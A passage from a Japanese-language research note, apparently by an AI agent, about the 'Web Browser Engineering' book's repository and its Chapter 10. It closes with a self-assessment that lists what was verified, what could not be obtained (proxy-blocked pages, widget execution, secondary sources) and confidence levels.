| ウィジェットの操作感 | サイトでのみ | clone 後 `make widgets` でローカル生成も可能（pandoc等のビルド環境が必要）。または `src/` のPythonを直接実行 |
| 日本語の正式訳語 | — | 日本語版（オライリー・ジャパン）`https://www.oreilly.co.jp/books/9784814401574/` |

---

## 2-H. 第2次補完の自己評価と、書いていないことの明示

- **解消した欠落**: (a) 図版3点 → 実画像を開いて内容を記述（2-A）。(b) Outline節 → 生成スクリプトを実行して第10章分の実出力を取得（2-B）。(c) クイズ → **前提が誤りだったことを確認し訂正**（2-C）。(d) ウィジェット → 構造とサンドボックス上の限界を確定（2-D）。
- **追加で判明した重要事項**: `book/LICENSE` による**本文の全権留保**（2-F）、`book/porting.md` の存在と版差（2-E）、依存バージョンの記述不一致（2-E）。
- **依然として取得できていないもの（捏造せず明示する）**:
  - 生成済みHTMLページそのもの（プロキシが `browser.engineering` をブロック）。ページ上の実際の見た目、ナビゲーション、フィードバックUIの有無は**未確認**。
  - アニメーションGIFの**コマごとの動き**。静止した合成像は確認したが、何がどの順に現れるかは未確認。
  - ウィジェットを**実際に動かした結果**。本ノートの記述は `lab10-browser.html` と `rt.js` の**コード読解に基づく推論**であり、実行結果ではない。該当箇所はそう明記した。
  - **二次情報による裏取り**。本セッションはWeb検索予算を使い切っており、著者の別記事・ブログ（`https://browserbook.substack.com/archive`）・書評等は**一切参照できていない**。二次情報が必要なら次のセッションで取得すること。
- **確信度**: 一次資料（公式リポジトリの原稿・コード・図・ビルド設定）に全面的に依拠しており、第10章および本書全体の構成については **high**。ただし公開サイトのレンダリング結果とウィジェットの実挙動については未検証であり、その部分のみ **medium**。
